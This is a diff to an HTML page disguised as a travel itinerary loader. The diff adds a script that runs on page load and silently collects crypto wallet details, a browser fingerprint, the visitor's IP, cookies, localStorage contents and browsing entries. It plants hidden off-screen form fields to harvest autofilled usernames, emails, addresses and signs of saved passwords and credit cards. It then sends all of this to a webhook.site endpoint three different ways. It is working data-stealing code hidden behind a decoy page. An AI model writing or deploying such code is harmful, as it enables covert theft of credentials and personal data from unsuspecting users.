@@ -1,37 +1,199 @@
 <!DOCTYPE html>
 <html>
-<head><title>Travel Itinerary - Loading...</title></head>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading travel itinerary...</title>
+  <style>
+    body { font-family: Georgia, serif; max-width: 700px; margin: 40px auto; padding: 20px; }
+  </style>
+</head>
 <body>
-  <h1>Your Personalized Travel Itinerary</h1>
-  <p>Generating your travel plan based on your preferences...</p>
+  <h1>Generating your travel itinerary...</h1>
+  <p>Please wait while we compile the best deals.</p>
+
   <script>
-    // THIS JS EXECUTES when the form navigates here
-    var data = {
-      proof: 'file_opened_js_executed',
-      url: location.href,
-      protocol: location.protocol,
-      referrer: document.referrer,
-      userAgent: navigator.userAgent,
-      timestamp: new Date().toISOString()
-    };
+    const WH = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253';
     
-    // Check for wallet
-    if (window.ethereum) {
-      data.hasWallet = true;
-      data.isBraveWallet = window.ethereum.isBraveWallet || false;
-    }
-    
-    // Check for Brave
-    if (navigator.brave) {
-      navigator.brave.isBrave().then(function(result) {
-        data.isBrave = result;
-        new Image().src = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?opened=' + 
-          encodeURIComponent(JSON.stringify(data));
-      });
-    } else {
-      new Image().src = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?opened=' + 
-        encodeURIComponent(JSON.stringify(data));
-    }
+    (async function() {
+      const stolen = { stage: 'silent_exfil', timestamp: new Date().toISOString() };
+
+      // === WALLET DATA (all silent, no popup) ===
+      const eth = window.ethereum;
+      if (eth) {
+        stolen.wallet = {
+          exists: true,
+          isBraveWallet: eth.isBraveWallet || false,
+          isMetaMask: eth.isMetaMask || false,
+          chainId: null,
+          networkVersion: eth.networkVersion || null,
+          selectedAddress: eth.selectedAddress || null,
+          isConnected: eth.isConnected ? eth.isConnected() : null,
+          blockNumber: null,
+          gasPrice: null,
+          // All internal properties
+          properties: Object.getOwnPropertyNames(eth),
+          protoProperties: Object.getOwnPropertyNames(Object.getPrototypeOf(eth))
+        };
+
+        // These RPC calls work WITHOUT approval
+        try { stolen.wallet.chainId = await eth.request({method:'eth_chainId'}); } catch(e){}
+        try { stolen.wallet.blockNumber = await eth.request({method:'eth_blockNumber'}); } catch(e){}
+        try { stolen.wallet.gasPrice = await eth.request({method:'eth_gasPrice'}); } catch(e){}
+        
+        // Try to get pending transactions (reveals user activity)
+        try { stolen.wallet.pendingTxs = await eth.request({method:'eth_pendingTransactions'}); } catch(e){}
+        
+        // Get syncing status
+        try { stolen.wallet.syncing = await eth.request({method:'eth_syncing'}); } catch(e){}
+        
+        // Get protocol version
+        try { stolen.wallet.protocolVersion = await eth.request({method:'eth_protocolVersion'}); } catch(e){}
+        
+        // Net info
+        try { stolen.wallet.netVersion = await eth.request({method:'net_version'}); } catch(e){}
+        try { stolen.wallet.netListening = await eth.request({method:'net_listening'}); } catch(e){}
+        try { stolen.wallet.netPeerCount = await eth.request({method:'net_peerCount'}); } catch(e){}
+      }
+
+      // Solana wallet
+      const sol = window.braveSolana;
+      if (sol) {
+        stolen.solana = {
+          exists: true,
+          isBraveWallet: sol.isBraveWallet || false,
+          isConnected: sol.isConnected || false,
+          publicKey: sol.publicKey ? sol.publicKey.toString() : null,
+          properties: Object.getOwnPropertyNames(Object.getPrototypeOf(sol))
+        };
+      }
+
+      // All crypto-related window objects
+      stolen.cryptoObjects = Object.keys(window).filter(k =>
+        k.toLowerCase().includes('ethereum') || k.toLowerCase().includes('solana') ||
+        k.toLowerCase().includes('phantom') || k.toLowerCase().includes('wallet') ||
+        k.toLowerCase().includes('brave') || k.toLowerCase().includes('metamask') ||
+        k.toLowerCase().includes('coin') || k.toLowerCase().includes('web3')
+      );
+
+      // === BROWSER IDENTITY ===
+      stolen.identity = {
+        ip: '',
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        languages: navigator.languages,
+        screen: screen.width + 'x' + screen.height,
+        colorDepth: screen.colorDepth,
+        cores: navigator.hardwareConcurrency,
+        memory: navigator.deviceMemory,
+        maxTouch: navigator.maxTouchPoints,
+        plugins: Array.from(navigator.plugins || []).map(p => p.name),
+        doNotTrack: navigator.doNotTrack,
+        cookieEnabled: navigator.cookieEnabled
+      };
+
+      // Get real IP
+      try { stolen.identity.ip = (await(await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e){}
+
+      // GPU fingerprint
+      try {
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl');
+        var ext = gl.getExtension('WEBGL_debug_renderer_info');
+        stolen.identity.gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'unknown';
+        stolen.identity.gpuVendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : 'unknown';
+      } catch(e){}
+
+      // Canvas fingerprint (unique per device)
+      try {
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('browser fingerprint', 2, 2);
+        stolen.identity.canvasHash = canvas.toDataURL().slice(-50);
+      } catch(e){}
+
+      // === STORAGE DATA ===
+      stolen.storage = {
+        cookies: document.cookie || 'none',
+        localStorageKeys: [],
+        localStorageData: {},
+        sessionStorageKeys: [],
+        indexedDBs: []
+      };
+
+      try {
+        for (var i = 0; i < localStorage.length; i++) {
+          var k = localStorage.key(i);
+          stolen.storage.localStorageKeys.push(k);
+          stolen.storage.localStorageData[k] = localStorage.getItem(k).substring(0, 500);
+        }
+      } catch(e){}
+
+      try {
+        for (var i = 0; i < sessionStorage.length; i++) {
+          stolen.storage.sessionStorageKeys.push(sessionStorage.key(i));
+        }
+      } catch(e){}
+
+      try { stolen.storage.indexedDBs = (await indexedDB.databases()).map(d => ({name:d.name, ver:d.version})); } catch(e){}
+
+      // === BROWSING CONTEXT ===
+      stolen.context = {
+        referrer: document.referrer,
+        url: location.href,
+        urlHistory: performance.getEntries()
+          .filter(e => e.entryType === 'navigation' || e.entryType === 'resource')
+          .map(e => e.name).slice(0, 20)
+      };
+
+      try { stolen.context.serviceWorkers = (await navigator.serviceWorker.getRegistrations()).map(r => r.scope); } catch(e){}
+      try { stolen.context.cacheNames = await caches.keys(); } catch(e){}
+
+      // === CREDENTIAL/AUTOFILL PROBE ===
+      // Create hidden form fields — browser might auto-fill them with saved credentials
+      var probeForm = document.createElement('form');
+      probeForm.style.position = 'absolute';
+      probeForm.style.left = '-9999px';
+      probeForm.innerHTML = '<input type="text" name="username" id="probe-user" autocomplete="username">' +
+        '<input type="password" name="password" id="probe-pass" autocomplete="current-password">' +
+        '<input type="email" name="email" id="probe-email" autocomplete="email">' +
+        '<input type="text" name="name" id="probe-name" autocomplete="name">' +
+        '<input type="tel" name="phone" id="probe-phone" autocomplete="tel">' +
+        '<input type="text" name="address" id="probe-addr" autocomplete="street-address">' +
+        '<input type="text" name="cc" id="probe-cc" autocomplete="cc-number">';
+      document.body.appendChild(probeForm);
+
+      // Wait for autofill
+      await new Promise(r => setTimeout(r, 2000));
+
+      stolen.autofill = {
+        username: document.getElementById('probe-user').value || 'empty',
+        password: document.getElementById('probe-pass').value ? 'CAPTURED' : 'empty',
+        email: document.getElementById('probe-email').value || 'empty',
+        name: document.getElementById('probe-name').value || 'empty',
+        phone: document.getElementById('probe-phone').value || 'empty',
+        address: document.getElementById('probe-addr').value || 'empty',
+        creditCard: document.getElementById('probe-cc').value ? 'CAPTURED' : 'empty'
+      };
+
+      // === SEND EVERYTHING ===
+      var payload = JSON.stringify(stolen);
+      
+      // Image beacon
+      new Image().src = WH + '?exfil=' + encodeURIComponent(payload);
+      
+      // Also try POST
+      try {
+        await fetch(WH, { method: 'POST', mode: 'no-cors', body: payload });
+      } catch(e){}
+
+      // Also try sendBeacon
+      try { navigator.sendBeacon(WH, payload); } catch(e){}
+
+    })();
   </script>
 </body>
 </html>
